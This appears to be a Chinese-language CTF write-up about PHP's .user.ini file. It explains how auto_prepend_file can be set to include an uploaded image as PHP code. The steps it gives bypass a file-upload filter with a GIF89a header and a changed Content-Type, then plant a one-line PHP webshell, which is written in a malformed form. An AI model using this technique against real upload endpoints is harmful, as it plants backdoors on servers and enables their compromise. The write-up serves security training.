**一.背景知识**

1.INI文件是什么

  INI文件是一种无标准格式的配置文件，用于配置计算机程序的配置参数和初始设置。<font style="color:rgb(211, 207, 202);background-color:rgb(24, 26, 27);"></font>

 2.php.ini是什么

   php.ini是php默认的配置文件，包括了很多php的基础设置。这些配置中，又分为几种：PHP_INI_SYSTEM、PHP_INI_PERDIR、PHP_INI_ALL、PHP_INI_USER。（[官方文档链接](https://www.php.net/manual/zh/ini.list.php)）文档中就提到了模式为PHP_USER_INI的配置项， 可以在ini_set()函数中设置、注册表中设置，再就是.user.ini中设置。  

  3.user.ini是什么

   .user.ini就是php的一个配置文件，官方文档在[这里](https://www.php.net/manual/zh/configuration.file.per-user.php)解释道：

> 除了主 php.ini 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录（$_SERVER['DOCUMENT_ROOT'] 所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。
>

> 在 .user.ini 风格的 INI 文件中只有具有 PHP_INI_PERDIR 和 PHP_INI_USER 模式的 INI 设置可被识别。
>

因此，这里就很清楚了，.user.ini实际上就是一个可以由用户“自定义”的php.ini，我们能够自定义的设置是模式为“PHP_INI_PERDIR 、 PHP_INI_USER”的设置。（上面表格中没有提到的PHP_INI_PERDIR也可以在.user.ini中设置）

实际上，除了PHP_INI_SYSTEM以外的模式（包括PHP_INI_ALL）都是可以通过.user.ini来设置的。

而且，和php.ini不同的是，.user.ini是一个能被动态加载的ini文件。也就是说我修改了.user.ini后，不需要重启服务器中间件，只需要等待user_ini.cache_ttl所设置的时间（默认为300秒），即可被重新加载。

 然后我们看到php.ini中的配置项，可惜我沮丧地发现，只要稍微敏感的配置项，都是PHP_INI_SYSTEM模式的（甚至是php.ini only的），包括disable_functions、extension_dir、enable_dl等。 不过，我们可以很容易地借助.user.ini文件来构造一个“后门”。  

 Php配置项中有两个比较有意思的项（下图第一、四个）：  

![](https://cdn.nlark.com/yuque/0/2024/png/43146588/1711447088096-21986509-c6d1-4173-bf2f-2dadfb7e15d3.png)

auto_append_file、auto_prepend_file，点开看看什么意思：  

![](https://cdn.nlark.com/yuque/0/2024/png/43146588/1711447140424-8f738c4f-f6e5-4ec2-bcb1-0d30d3cdb534.png)

 指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了require()函数。而auto_append_file类似，只是在文件后面包含。 

二.使用方法

直接写进.use.ini文件里：

`auto_prepend_file=a.jpg`

就像这道[文件上传](https://adworld.xctf.org.cn/challenges/list?rwNmOdr=1711443892502)，先新建一个.user.ini文件，内容是

`GIF89a`

`auto_prepend_file=a.jpg`

将Content-Type改为image/jpg，放包后显示上传成功和上传文件路径，之后新建文档a.txt并写入

GIF89a

<?=POST['aaa'];?>

并将后缀名改为.jpg，就成功绕过了网站.php后缀名的检查并成功上传了php的后门。

